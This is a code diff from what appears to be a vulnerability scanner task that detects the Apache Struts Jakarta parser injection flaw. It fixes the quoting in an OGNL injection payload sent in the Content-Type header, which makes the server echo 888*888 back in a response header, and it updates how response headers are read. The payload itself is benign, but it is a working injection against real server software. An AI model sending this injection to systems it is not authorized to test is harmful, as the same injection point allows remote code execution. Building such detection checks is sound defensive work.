@@ -33,7 +33,7 @@ class ApacheStrutsJakartaParser < BaseTask
     uri = _get_entity_name
 
     headers = {}
-    headers["Content-Type"] = "%{#context[‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’].addHeader(‘X-Intrigue-Struts’,888*888)}.multipart/form-data"
+    headers["Content-Type"] = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Intrigue-Struts',888*888)}.multipart/form-data"
     response = http_request(:get, uri, nil, headers) # no auth
 
     unless response
@@ -42,12 +42,12 @@ class ApacheStrutsJakartaParser < BaseTask
     end
 
     # show the response in the logs 
-    response.each {|x| _log "#{x}: #{response.header[x]}"}
+    response.headers.each {|x| _log "#{x}: #{response.headers[x]}"}
         
-    if response.header['X-Intrigue-Struts'] =~ /788544/
+    if response.headers['X-Intrigue-Struts'] =~ /788544/
       
       instance_details = { 
-        proof: "#{response.header['X-Intrigue-Struts']}",
+        proof: "#{response.headers['X-Intrigue-Struts']}",
       }
       _create_linked_issue "apache_struts_jakarta_parser", instance_details
     end
